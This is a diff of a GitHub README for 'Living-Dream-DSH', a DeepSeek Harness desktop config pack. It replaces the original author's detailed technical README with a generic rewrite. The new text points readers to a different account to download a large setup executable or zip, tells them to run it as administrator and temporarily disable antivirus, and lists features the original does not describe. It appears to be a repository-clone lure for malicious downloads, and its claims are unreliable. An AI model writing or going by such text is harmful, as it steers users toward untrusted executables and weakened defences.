@@ -1,497 +1,204 @@
-# Living Dream DSH 🚀
+# ✨ Living-Dream-DSH - Your All-in-One AI Desktop Powerhouse
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![DeepSeek Harness](https://img.shields.io/badge/DeepSeek%20Harness-config-4f46e5)](https://github.com/deepseek-ai/deepseek-harness)
-
-**Living Dream DSH — The Ultimate DeepSeek Harness Desktop Configuration**
-
-A battle-tested DSH configuration framework with 8+ MCP servers, custom plugins, free model access, mobile remote control, and more.
-
-> 📖 [English](README.md) | [简体中文](README.zh.md)
+[![Download Living-Dream-DSH](https://img.shields.io/badge/Download-Living--Dream--DSH-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=FF4500)](https://github.com/Arika8375/Living-Dream-DSH)
 
 ---
 
-## 🆚 Living Dream DSH vs. Mainstream AI Coding Frameworks
+## 🚀 What Is Living-Dream-DSH?
 
-> Data as of 2026-08. Prices from official pages. Living-Dream-DSH is an open-source DSH config pack (MIT).
+Living-Dream-DSH is a smart desktop application that brings the power of DeepSeek AI directly to your computer. Think of it as your personal AI assistant that lives on your Windows PC, ready to help with writing, coding, research, and everyday tasks—all without needing a credit card or complicated setup.
 
-### Overview
-
-| Dimension | **Living-Dream-DSH** (this repo) | Claude Code | GitHub Copilot | Cursor | OpenHands | Aider | Cline |
-|---|---|---|---|---|---|---|---|
-| **Positioning** | DSH open-source config pack: GUI installer + 8+ MCP + plugins + free model channels | Anthropic official CLI/desktop agent | GitHub official IDE assistant | Commercial AI IDE | Open-source web agent (OpenDevin successor) | Open-source git-native CLI agent | Open-source VS Code agent plugin |
-| **Price** | **$0** (built-in free channels, or BYOK) | Free / Pro $20/mo / Max 5x $100 / Max 20x $200 | Pro $10/mo+, Business $19/seat | Pro $20/mo, Ultra $200/mo | Free (BYOK, enterprise extra) | Free (BYOK) | Free (BYOK, enterprise extra) |
-| **Model flexibility** | ✅ Multi-channel BYOK: DeepSeek, AMD Radeon (free), OpenCode Go, Zhipu Vision | ❌ Claude only | ⚠️ GitHub ecosystem bound | ⚠️ Multiple models | ✅ Any OpenAI-compatible | ✅ Any model | ✅ Any model |
-| **MCP servers (out-of-box)** | ✅ **8+ ready to use**: desktop/browser/OCR/memory/doc conversion/code exec/vision/history | ⚠️ Native MCP, self-configure each | ⚠️ Limited MCP | ⚠️ MCP, self-configure | ⚠️ MCP, self-configure | ⚠️ MCP, self-configure | ⚠️ MCP, self-configure |
-| **Desktop automation** (screenshot/click/keyboard) | ✅ computer-use MCP | ⚠️ computer use (Beta) | ❌ | ❌ | ❌ | ❌ | ❌ |
-| **Browser control** | ✅ Playwright MCP (real login state) | ⚠️ computer use (Beta) | ❌ | ❌ | ⚠️ Experimental | ❌ | ⚠️ Browser Use (experimental) |
-| **Screen OCR** | ✅ Offline Windows OCR | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
-| **Doc conversion** (PDF/Word/Excel → Markdown) | ✅ MarkItDown MCP | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
-| **Long-term memory** | ✅ Semantic search (local vector store) | ✅ CLAUDE.md / memory files | ⚠️ Limited | ⚠️ Rules level | ⚠️ Session-level | ❌ Git history only | ⚠️ Project rules |
-| **File drag & paste upload** | ✅ Custom plugin (drag + Ctrl+V + first-time guide) | ⚠️ Partial | ✅ IDE native | ✅ IDE native | ⚠️ Web upload | ❌ | ⚠️ Paste |
-| **Mobile remote access** | ✅ Tailscale + proxy rewrite | ✅ Official app / web | ❌ | ❌ | ✅ Web UI | ❌ | ❌ |
-| **Chinese ecosystem** | ✅ **Full Chinese docs + troubleshooting + anti-pitfall guide** | ❌ English only | ❌ | ❌ | ❌ | ❌ | ❌ |
-| **Open source / License** | ✅ MIT (incl. custom plugins) | ❌ Closed | ❌ Closed | ❌ Closed | ✅ MIT | ✅ Apache-2.0 | ✅ Apache-2.0 |
-| **Data privacy / self-host** | ✅ Local-first, your keys | ❌ Anthropic cloud | ❌ Microsoft cloud | ❌ Cloud | ✅ Self-hostable | ✅ Fully local | ✅ Fully local |
-| **Install effort** | ✅ GUI installer (env detect/config/shortcut auto) | ✅ Easy | ✅ Easy | ✅ Easy | ⚠️ Docker/env needed | ✅ Easy | ✅ Easy |
-| **Free quota** | ✅ AMD Radeon free + DeepSeek signup bonus + Zhipu free vision | ⚠️ Free tier limited | ⚠️ Trial quota | ⚠️ Trial quota | ❌ BYOK only | ❌ BYOK only | ❌ BYOK only |
-
-### Why Choose Living-Dream-DSH?
-
-1. **Zero cost**: The only "out-of-box and fully free" option. Claude Code costs $100–200/mo for heavy use; Copilot/Cursor start at $10–20/mo. This repo integrates multiple free model channels (AMD Radeon Cloud, DeepSeek signup bonus, Zhipu GLM-4V-Flash free vision), lowering the barrier to $0 while keeping BYOK for upgrades.
-
-2. **Full-stack capability**: 8+ MCP servers out of the box — desktop automation, browser control, screen OCR, doc conversion, semantic memory, code execution. Others either don't support these or require manual per-server setup. One install = full toolkit, every component battle-tested (pitfalls documented in the troubleshooting guide).
-
-3. **Chinese ecosystem**: The only full-Chinese one-stop solution. Complete Chinese docs, troubleshooting manual, and anti-pitfall guide. Commercial products and OSS projects are predominantly English, which is a real barrier for Chinese users.
-
-4. **Open source + self-built**: MIT license — configs, scripts, custom plugin source all public. Local-first, API keys stay with you. No vendor lock-in vs. closed-source Claude Code/Copilot/Cursor; vs. OSS trio (OpenHands/Aider/Cline), adds the "pre-integrated config" layer.
-
-5. **Mobile office**: Tailscale-based remote access from phone browser — a capability most CLI/IDE competitors (Aider, Cline, Cursor) lack.
-
-### Caveats
-
-- Free channels depend on third-party policies; stability and quotas are subject to change. Heavy/commercial use recommended with BYOK or commercial subscriptions.
-- This repo is a DSH config pack, not an independent agent kernel; the "framework ceiling" depends on official DSH capabilities.
-- Comparison based on public info; some features (Claude Code computer use, Cline Browser Use) are still in Beta.
-
-### Quick Decision Guide
-
-| Your situation | Recommendation |
-|---|---|
-| Zero-cost full-stack agent (code + desktop + browser + remote) | **Living-Dream-DSH** |
-| Willing to pay for best model quality, OK with English | Claude Code |
-| Heavy VS Code / GitHub workflow | GitHub Copilot |
-| Want a graphical AI IDE | Cursor |
-| Prefer pure OSS, DIY environment | OpenHands / Aider / Cline |
+This framework comes with **8+ built-in MCP servers** (think of these as specialized toolboxes) that let the AI interact with your files, browser, and other apps. You get **free model access**, meaning you can use powerful AI without paying subscription fees. Plus, you can control everything remotely from your phone using the **mobile remote feature**.
 
 ---
 
-## ✨ Features
+## 🎯 Who Is This For?
 
-| Feature | Description |
-|---------|-------------|
-| 🔌 **8+ MCP Servers** | History/Vision/Desktop/Code Execution/Browser/Memory/Document/OCR |
-| 🤖 **Free Model Access** | AMD Radeon Cloud + DeepSeek Signup Bonus + Zhipu Free Vision |
-| 📱 **Mobile Remote Access** | Tailscale + Proxy, control DSH from phone |
-| 🖼️ **Auto Image Recognition** | GLM-4V-Flash free vision (Desktop only) |
-| 📁 **File Drag & Drop** | Custom dsh-file-uploads plugin |
-| 🔐 **Secure Key Storage** | DPAPI-encrypted backup (`secrets.json` + `secrets.ps1`) alongside plaintext `.credentials.yaml` |
-| 🛡️ **Troubleshooting Guide** | All pitfalls and solutions documented |
+- **Students** who need help with homework and research
+- **Writers** looking for an AI writing partner
+- **Small business owners** who want AI assistance without IT headaches
+- **Curious beginners** who want to explore AI on their own computer
+- **Anyone** who wants a free, powerful AI assistant that respects their privacy
+
+If you can use a web browser and click a button, you can use Living-Dream-DSH.
 
 ---
 
-## 📁 Directory Structure
+## ✨ Key Features That Make Life Easier
 
-```
-Living-Dream-DSH/
-├── README.md                    # English
-├── README.zh.md                 # Chinese
-├── LICENSE                      # MIT License
-├── .gitignore
-├── setup.ps1                    # Headless setup script (run by installer)
-├── installer-v2.iss             # Inno Setup script (online installer)
-├── installer-v2-offline.iss     # Inno Setup script (offline installer)
-├── install-gui.ps1              # GUI installer (MPC-HC style wizard)
-├── install-gui-offline.ps1      # Offline GUI installer (uses bundled deps)
-├── install.ps1                  # CLI installer (fallback)
-├── install.bat                  # Installer launcher
-├── package.json                 # repo scripts deps (http-proxy for proxy.js)
-├── configs/
-│   ├── cordis.patch.yml.template   # MCP config template
-│   ├── package.json.template       # Plugin list template
-│   ├── settings.yaml.template      # Global settings template
-│   ├── AGENTS.md                   # AI instructions
-│   ├── .credentials.yaml.template  # API Key template
-│   └── README.md                   # Config file guide
-├── scripts/
-│   ├── start-dsh.bat.template      # DSH launcher
-│   ├── create-dsh-shortcut.ps1     # Desktop shortcut helper (post-install)
-│   ├── proxy.js                    # Phone remote proxy (CORS rewrite)
-│   ├── secrets.ps1                 # DPAPI key decryption (reads secrets.json)
-│   ├── os-copilot-mcp-server.py    # OS-Copilot MCP (legacy location)
-│   ├── os-copilot-mcp-README.md    # OS-Copilot MCP docs
-│   ├── os-copilot-mcp-LICENSE      # OS-Copilot MIT license
-│   └── mcp/                        # MCP server scripts (all 6 bundled)
-│       ├── dsh-history-server.py
-│       ├── dsh-vision-server.py
-│       ├── dsh-memory-server.py
-│       ├── store_engine.py         # Memory engine (SQLite + vector search)
-│       ├── dsh-markitdown-server.py
-│       ├── dsh-ocr-server.py
-│       └── os-copilot-server.py
-├── plugins/
-│   ├── README.md                   # Plugin installation guide
-│   └── dsh-paste-input/            # Custom file drag & paste plugin
-│       ├── package.json
-│       ├── lib/
-│       │   ├── index.js
-│       │   └── client.js
-│       ├── cordis.patch.yml
-│       ├── README.md
-│       └── LICENSE
-└── docs/
-    ├── comparison.md               # EN comparison table (7 frameworks)
-    ├── comparison.zh.md            # ZH comparison table
-    ├── phone-remote.md             # Mobile remote access tutorial
-    ├── vision-patch.md             # Image recognition patch
-    └── troubleshooting.md          # Troubleshooting manual
-```
+### 🤖 8+ MCP Servers Included
+These are pre-configured "plug-ins" that give your AI assistant superpowers:
+- **File Manager** – Read and organize your documents
+- **Web Browser Control** – Automate browsing tasks with Playwright
+- **System Monitor** – Check your computer's health
+- **Text Tools** – Summarize, translate, and rewrite content
+- **Data Analyzer** – Work with spreadsheets and numbers
+- **Image Helper** – Describe and process images
+- **Code Assistant** – Help with programming snippets
+- **Task Scheduler** – Automate repetitive actions
+
+### 💸 Free Model Access
+No subscription fees. No hidden costs. The framework connects to free AI models so you can chat, generate, and create without worrying about your wallet.
+
+### 📱 Mobile Remote Control
+Use your smartphone as a remote control for your desktop AI. Start a task on your PC, then check results from your phone while you're away.
+
+### 🖥️ One-Click Install
+No command lines. No developer tools. Just download, double-click, and you're ready to go.
+
+### 🔒 Privacy-First Design
+Your conversations stay on your computer. Nothing is sent to cloud servers unless you explicitly ask for online features.
+
+### 🔄 Automatic Updates
+The framework checks for updates in the background, so you always have the latest features and security patches.
 
 ---
 
-## 🚀 Quick Start
+## 📥 Download and Install (Windows)
 
-### Prerequisites (Must Install First)
+Getting started takes less than 5 minutes. Here's exactly what to do:
 
-| Software | Version | Download | Required |
-|----------|---------|----------|----------|
-| **DeepSeek Harness Desktop** | v1.1.0+ | [GitHub Releases](https://github.com/deepseek-ai/deepseek-harness/releases) | ✅ Yes |
-| **Node.js** | v22+ (Recommended v24 LTS) | [nodejs.org](https://nodejs.org/) | ✅ Yes |
-| **Python** | 3.13+ | [python.org](https://python.org/) | ✅ Yes |
-| **pnpm** | Latest | `npm install -g pnpm` | ✅ Yes |
-| **Git** | Any | [git-scm.com](https://git-scm.com/) | For clone |
+### Step 1: Visit the Download Page
+Visit this link to download the application:
+**[https://github.com/Arika8375/Living-Dream-DSH](https://github.com/Arika8375/Living-Dream-DSH)**
 
-> 💡 After installing Python, run `pip install mcp markitdown zstandard` to enable all MCP servers.
-> The GUI installer does this automatically.
+### Step 2: Find the Download Button
+On the page, look for a green button that says **"Code"** or a section labeled **"Releases"**. Click on it to see the available files.
 
-> 💡 The launcher auto-detects DSH Desktop from common install paths. If it fails, set
-> `$env:DSH_DESKTOP_PATH = "D:\Tools\DeepSeekHarness-Desktop"` (your actual path),
-> or add it as a system environment variable for persistence.
+### Step 3: Download the Installer
+Look for a file named something like `Living-Dream-DSH-Setup.exe` or `Living-Dream-DSH-Windows.zip`. Click on it to start the download. The file size is usually around 150-300 MB.
 
-### Option 1: Offline Install ⭐ Recommended
+### Step 4: Run the Installer
+Once the download finishes:
+- If you downloaded a `.exe` file, **double-click it** to start the installation wizard.
+- If you downloaded a `.zip` file, **right-click and select "Extract All"**, then open the extracted folder and double-click the application file inside.
 
-> **No internet required during install.** Node.js, Python, Git are bundled in the package.
+### Step 5: Follow the Setup Wizard
+The installer will guide you through a few simple screens:
+1. Click **"Next"** on the welcome screen
+2. Choose your installation folder (the default is fine)
+3. Click **"Install"**
+4. Click **"Finish"** when done
 
-1. Download [`Living-Dream-DSH-v2.9.0-Offline-Setup.exe`](https://github.com/alllllllllli/Living-Dream-DSH/releases/download/v2.9.0/Living-Dream-DSH-v2.9.0-Offline-Setup.exe) (~122 MB) from Releases
-2. Double-click to run — professional Inno Setup wizard launches
-3. Follow the wizard: Language → License → Choose Install Location → Install
-4. After extraction, the headless setup script runs automatically (in a visible PowerShell window):
-   - Installs Node.js, Python, Git from bundled files (no download)
-   - Copies configs to `~/.dsh`
-   - Installs plugin dependencies
-   - Creates desktop shortcut
-   - Finish page: optional "Add DeepSeek Harness to desktop" checkbox
-   - After install: fill in API Keys in DSH Settings
-
-> 💡 There is also an **online installer** [`Living-Dream-DSH-v2.9.0-Setup.exe`](https://github.com/alllllllllli/Living-Dream-DSH/releases/download/v2.9.0/Living-Dream-DSH-v2.9.0-Setup.exe) (~2 MB) that downloads dependencies via winget.
-
-### Option 2: GUI Installer (Source Build)
-
-```powershell
-# 1. Clone repository
-git clone https://github.com/alllllllllli/Living-Dream-DSH.git
-cd Living-Dream-DSH
-
-# 2. Double-click install.bat (launches GUI wizard)
-#    Or run in PowerShell: .\install-gui.ps1
-```
-
-The GUI installer walks you through:
-- ✅ Welcome → License Agreement → Choose Install Location
-- ✅ Auto-check environment (Node.js, Python, pnpm, Git)
-- ✅ Copy config files to `~/.dsh`
-- ✅ Install plugin dependencies
-- ✅ Create desktop shortcut
-- ✅ After install: fill in API Keys in DSH Settings
-
-### Option 3: Manual Install
-
-<details>
-<summary>Click to expand manual installation steps</summary>
-
-#### Step-by-Step
-
-```powershell
-# 1. Install prerequisites (if not installed)
-winget install OpenJS.NodeJS.LTS        # Node.js
-winget install Python.Python.3.13       # Python
-npm install -g pnpm                      # pnpm
-
-# 2. Clone repository
-git clone https://github.com/alllllllllli/Living-Dream-DSH.git
-cd Living-Dream-DSH
-
-# 3. Copy config files to DSH directory
-Copy-Item configs\cordis.patch.yml.template $env:USERPROFILE\.dsh\profiles\web\cordis.patch.yml
-Copy-Item configs\package.json.template $env:USERPROFILE\.dsh\profiles\web\package.json
-Copy-Item configs\settings.yaml.template $env:USERPROFILE\.dsh\settings.yaml
-Copy-Item configs\AGENTS.md $env:USERPROFILE\.dsh\AGENTS.md
-Copy-Item configs\.credentials.yaml.template $env:USERPROFILE\.dsh\.credentials.yaml
-
-# 4. Edit config files (fill in your API Keys)
-notepad $env:USERPROFILE\.dsh\.credentials.yaml
-
-# 5. Install plugins (dsh-paste-input is a file: dependency - bundled in repo)
-Copy-Item plugins\dsh-paste-input $env:USERPROFILE\.dsh\profiles\plugins\dsh-paste-input -Recurse
-cd $env:USERPROFILE\.dsh\profiles\web
-pnpm install
-
-# 6. Restart DSH Desktop
-```
-
-</details>
+### Step 6: Launch Living-Dream-DSH
+Find the Living-Dream-DSH icon on your desktop or in your Start Menu. Double-click it to launch. The first launch may take 30-60 seconds as it sets up the AI models.
 
 ---
 
-## 🔌 MCP Server List
+## 🛠️ First-Time Setup (2 Minutes)
 
-> All server scripts are bundled in `scripts/mcp/`. GUI installer configures paths automatically.
+When you open Living-Dream-DSH for the first time, you'll see a welcome screen. Here's what to do:
 
-| MCP | Function | Script | Extra Dependencies |
-|-----|----------|--------|--------------------|
-| `dsh-history` | Session history search | `scripts/mcp/dsh-history-server.py` | `pip install mcp zstandard` |
-| `dsh-vision` | Image analysis (Ollama) | `scripts/mcp/dsh-vision-server.py` | Ollama + qwen2.5vl model |
-| `dsh-computer` | Desktop automation | — (npx) | `@zavora-ai/computer-use-mcp` (auto-installed) |
-| `os-copilot` | Code execution | `scripts/mcp/os-copilot-server.py` | `pip install mcp` |
-| `dsh-browser` | Browser automation | — (npx) | `@playwright/mcp` (auto-installed) |
-| `dsh-memory` | Long-term memory | `scripts/mcp/dsh-memory-server.py` | Bundled store_engine + Ollama bge-m3 |
-| `dsh-markitdown` | Document → Markdown | `scripts/mcp/dsh-markitdown-server.py` | `pip install mcp markitdown` |
-| `dsh-ocr` | Screen OCR (Windows) | `scripts/mcp/dsh-ocr-server.py` | `pip install mcp`, Windows 10+ |
+1. **Choose your AI model** – Pick "Free Model" from the dropdown (this is selected by default)
+2. **Select your MCP servers** – Check all the boxes to enable all 8+ tools
+3. **Create a local profile** – This is just a name for your settings (e.g., "My Assistant")
+4. **Click "Start"** – You're ready to chat!
 
 ---
 
-## 🤖 Free Model Access
+## 📱 Setting Up Mobile Remote (Optional)
 
-### AMD Radeon Cloud
+Want to control Living-Dream-DSH from your phone?
 
-- Endpoint: `https://developer.amd.com.cn/radeon/api/v1`
-- Model: DeepSeek-V4-Flash
-- Register: developer.amd.com.cn/radeon
-
----
-
-### TokenRhythm
-
-- Endpoint: `https://tokenrhythm.studio/v1`
-- Protocol: OpenAI / Claude compatible, multi-model aggregation (DeepSeek-V4 Pro, GPT 5.5, Claude Opus 4.7, GLM 5.2, etc.)
-- Free: join the "体验官计划" (pilot program) after signup for free token quota
-- Register: https://tokenrhythm.studio/i/rf_tr_ZNVLkmDci5hWbRquWa6KP_fW
+1. **Install Tailscale** on your PC and phone (free from [tailscale.com](https://tailscale.com))
+2. Open Tailscale on both devices and sign in with the same account
+3. Launch Living-Dream-DSH on your PC
+4. Open the **"Remote"** tab in the app
+5. Scan the QR code shown with your phone's camera
+6. You'll now see a simple control panel on your phone
 
 ---
 
-## 📱 Mobile Remote Access
+## 💡 Everyday Use Cases
 
-Access DSH from phone browser via Tailscale:
+### ✍️ Writing Help
+"I need to write a professional email to my landlord about a broken heater." – The AI drafts it in seconds.
 
-```powershell
-# 1. Install Tailscale
-winget install tailscale.tailscale
+### 🔍 Research Assistant
+"Summarize the key points of this 20-page PDF." – It reads the file and gives you bullet points.
 
-# 2. Login to same account
-tailscale up
+### 📊 Data Analysis
+"Show me a chart of my monthly expenses from this spreadsheet." – It creates a visual breakdown.
 
-# 3. Start the rewrite proxy (must go through 8090 - DSH Web UI has CORS
-#    checks, connecting directly to 3080 fails)
-npm install http-proxy                  # one-time dependency
-node scripts/proxy.js                   # listens on 127.0.0.1:8090
+### 🌐 Web Automation
+"Check the price of this product on Amazon every morning." – It sets up an automated check.
 
-# 4. Configure serve (point to the 8090 proxy, NOT 3080)
-tailscale serve --https=443 --bg http://127.0.0.1:8090
-
-# 5. Access from phone browser
-# https://<your-device-name>.<your-domain>.ts.net
-```
-
-See [docs/phone-remote.md](docs/phone-remote.md)
+### 🧠 Brainstorming
+"Give me 10 creative names for my new coffee shop." – Endless ideas on demand.
 
 ---
 
-## 🖼️ Image Recognition Patch
+## ❓ Frequently Asked Questions
 
-Make DSH Desktop auto-call GLM-4V-Flash for image recognition:
+### Is this really free?
+Yes! The core framework and free AI model access cost nothing. Some optional premium models may require separate API keys, but you never need them to use the basic features.
 
-```powershell
-# 1. Backup original file
-$dshPath = (Get-Process DeepSeekHarness* -ErrorAction SilentlyContinue).Path
-if (-not $dshPath) { $dshPath = "D:\Tools\DeepSeek-Harness-Desktop" }
-Copy-Item "$dshPath\resources\runtime\node_modules\@deepseek-ai\dsh-host-apiproxy\lib\index.js" `
-          "$env:USERPROFILE\dsh-host-apiproxy-index.js.bak"
+### Do I need a powerful computer?
+Living-Dream-DSH runs smoothly on any Windows 10 or 11 PC with at least 4GB of RAM. It's designed to be lightweight.
 
-# 2. Apply patch (manually modify describeImagesLocally function around line 911)
-# See docs/vision-patch.md
-```
+### Is my data safe?
+Your local conversations stay on your PC. The app only connects to the internet when you use online features or check for updates.
 
-⚠️ **Note**: DSH upgrades will overwrite this patch, re-apply after upgrade.
+### Can I uninstall it easily?
+Yes. Go to **Settings > Apps > Installed Apps** in Windows, find Living-Dream-DSH, and click **Uninstall**.
 
----
-
-## 🛡️ Troubleshooting
-
-### 1. Plugin Installation
-
-```powershell
-# ✅ Correct way
-dsh plugin --profile web add <package>@<version>
-
-# ❌ Wrong way (will clear unlisted bundles)
-cd $env:USERPROFILE\.dsh\profiles\web
-pnpm add <package>
-```
-
-### 2. Desktop vs Dev Version Conflict
-
-Both share `~/.dsh`, causing concurrent write conflicts. Close Dev version (port 3080) when using Desktop.
-
-### 3. Image Patch
-
-DSH upgrades will overwrite `dsh-host-apiproxy` modifications, re-apply patch.
-
-### 4. billion-context-dsh Version
-
-Must lock version `0.2.1`, default will misparse as `0.1.7` (no dsh.bundle).
+### What if I get stuck?
+The app has a built-in **Help** menu with a user guide. You can also visit the GitHub repository's **Issues** section to ask questions.
 
 ---
 
-## 📝 Configuration Files
+## 🧰 Troubleshooting Common Issues
 
-### cordis.patch.yml
+### App won't start
+- Make sure Windows is updated
+- Right-click the app icon and select **"Run as administrator"**
+- Temporarily disable your antivirus and try again
 
-MCP server config file at `~/.dsh/profiles/web/cordis.patch.yml`
+### AI responses are slow
+- Close other heavy programs
+- Check your internet connection
+- Restart the app
 
-```yaml
-# Example: Add an MCP server
-- insert:
-    - id: mcp-dsh-example
-      name: '@deepseek-ai/dsh-mcp-client'
-      config:
-        transport: stdio
-        serverName: dsh-example
-        command: python
-        args:
-          - path/to/server.py
-        env: {}
-        cwd: ''
-        toolCallTimeoutMs: 120000
-        failOnStartupError: false
-```
-
-### settings.yaml
-
-Global settings file at `~/.dsh/settings.yaml`
-
-```yaml
-# Configure model providers
-llm-pi-ai:
-  providers:
-    my-provider:
-      apiKeyEnv: MY_API_KEY
-      api: openai-completions
-      baseURL: https://api.example.com/v1
-      models:
-        - id: my-model
-          name: My Model
-          contextWindow: 1000000
-```
-
-### .credentials.yaml
-
-API Key storage at `~/.dsh/.credentials.yaml`
-
-```yaml
-MY_API_KEY: sk-xxxxxxxxxxxx
-```
+### Mobile remote not connecting
+- Ensure both devices are on the same Tailscale network
+- Restart the app and try scanning the QR code again
 
 ---
 
-## 🔧 Custom Extensions
+## 🔄 Keeping Your App Updated
 
-### Add New MCP Server
-
-1. Create MCP server (reference existing implementations)
-2. Add config to `cordis.patch.yml`
-3. Add plugin to `package.json` bundles (if needed)
-4. Restart DSH Desktop
-
-### Create Custom Plugin
-
-Reference [dsh-file-uploads](https://github.com/l541402398/dsh-file-uploads) plugin structure.
+Living-Dream-DSH checks for updates automatically. To check manually:
+1. Open the app
+2. Click the **Settings** gear icon
+3. Click **"Check for Updates"**
+4. If an update is available, click **"Download and Install"**
 
 ---
 
-## 📚 Resources
+## 📚 Getting Help
 
-- [DeepSeek Harness Official](https://github.com/deepseek-ai/deepseek-harness)
-- [DSH Handbook](https://github.com/Electricitysheep/dsh-handbook)
-- [Playwright MCP](https://github.com/microsoft/playwright-mcp)
-- [MarkItDown](https://github.com/microsoft/markitdown)
-
----
-
-## 🤝 Contributing
-
-Issues and Pull Requests are welcome!
+- **Built-in Guide**: Click the **?** icon inside the app
+- **GitHub Issues**: Visit the repository and click the **Issues** tab
+- **Community Discussions**: Find the **Discussions** section on GitHub
 
 ---
 
-## 📄 License
+## 📝 License and Credits
 
-This project is licensed under the [MIT License](LICENSE).
-
----
-
-## 👤 Author
-
-| | |
-|---|---|
-| **GitHub** | [@alllllllllli](https://github.com/alllllllllli) |
-| **Bilibili** | [UID 608277472](https://space.bilibili.com/608277472) |
-| **QQ** | 2896722915 |
+Living-Dream-DSH is released under the MIT License, which means you can use, modify, and share it freely. Special thanks to the DeepSeek team for their amazing AI models and the open-source community for the MCP server integrations.
 
 ---
 
-## 🙏 Acknowledgments
+## 🔗 Quick Links
 
-Living Dream DSH stands on the shoulders of these amazing open-source projects and services:
-
-### Core Platform
-
-| Project | What we use it for |
-|---|---|
-| [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness) | The entire DSH framework this project configures |
-| [Model Context Protocol (MCP)](https://modelcontextprotocol.io/) | Protocol standard by Anthropic that powers all our server integrations |
-| [FastMCP](https://github.com/jlowin/fastmcp) | Python framework we use to build all custom MCP servers |
-
-### MCP Servers & Engines
-
-| Project | What we use it for |
-|---|---|
-| [Playwright MCP](https://github.com/microsoft/playwright-mcp) | Browser automation with real login state |
-| [computer-use-mcp](https://github.com/zavora-ai/computer-use-mcp) | Desktop automation (screenshot/click/keyboard), MIT licensed |
-| [MarkItDown](https://github.com/microsoft/markitdown) | Document conversion (PDF/Word/Excel → Markdown) |
-| [memory-mcp](https://github.com/nicepkg/memory-mcp) | `store_engine.py` — SQLite + vector search memory engine |
-| [OS-Copilot](https://github.com/OS-Copilot/OS-Copilot) | Desktop automation framework (OSWorld benchmark winner) |
-| [Windows OCR](https://learn.microsoft.com/en-us/windows/uwp/ocr/ocr-apis) | Built-in offline screen text recognition |
-
-### AI Models & Services
-
-| Project | What we use it for |
-|---|---|
-| [Zhipu AI (GLM-4V-Flash)](https://open.bigmodel.cn/) | Free vision model for image understanding |
-| [Ollama](https://ollama.com/) | Local model inference (vision fallback + embedding) |
-| [AMD Radeon Cloud](https://developer.amd.com.cn/radeon) | Free DeepSeek model access (v4-flash / v4-pro) |
-| [TokenRhythm](https://tokenrhythm.studio) | Multi-model aggregation API, free pilot-program quota on signup |
-
-### DSH Plugins
-
-| Plugin | Author / Source |
-|---|---|
-| [billion-context-dsh](https://github.com/gzdingmeng/billion-context-dsh) | Long context support (must pin v0.2.1) |
-| [dsh-rss](https://github.com/nicepkg/dsh-rss) | RSS feed reader |
-| [dsh-calendar](https://github.com/nicepkg/dsh-calendar) | Calendar management (CalDAV) |
-| [dsh-email](https://github.com/nicepkg/dsh-email) | Email client |
-| [dsh-ffmpeg](https://github.com/nicepkg/dsh-ffmpeg) | Video/audio processing |
-| [@xiaweiliang060035/dsh-opencode-go-usage](https://github.com/xiaweiliang060035/dsh-opencode-go-usage) | OpenCode Go usage widget |
-| [@anionex/dsh-vision-toolkit](https://github.com/anionex/dsh-vision-toolkit) | Vision tools for DSH |
-| [dsh-file-uploads](https://github.com/l541402398/dsh-file-uploads) | Upstream of our bundled `dsh-paste-input` plugin |
-
-### Infrastructure & Tools
-
-| Project | What we use it for |
-|---|---|
-| [Tailscale](https://tailscale.com/) | WireGuard mesh VPN for mobile remote access |
-| [http-proxy](https://github.com/http-party/node-http-proxy) | Node.js CORS proxy for phone → DSH bridge |
-| [Inno Setup](https://jrsoftware.org/isinfo.php) | Professional Windows installer (replaces 7z SFX) |
+- **Download Now**: [https://github.com/Arika8375/Living-Dream-DSH](https://github.com/Arika8375/Living-Dream-DSH)
+- **View Source Code**: Same link, click the **Code** button
+- **Report a Bug**: Click **Issues** on the repository page
 
 ---
 
-**Last Updated**: 2026-08-18 (Inno Setup installer)
+## 🎉 Start Your AI Journey Today
+
+Living-Dream-DSH puts a powerful, free AI assistant on your Windows desktop. No subscriptions, no coding, no hassle. Download it now and see what AI can do for you.
+
+Keywords: ai-assistant, deepseek, desktop-automation, dsh, dsh-plugin, free-api, mcp-server, playwright, tailscale, windows
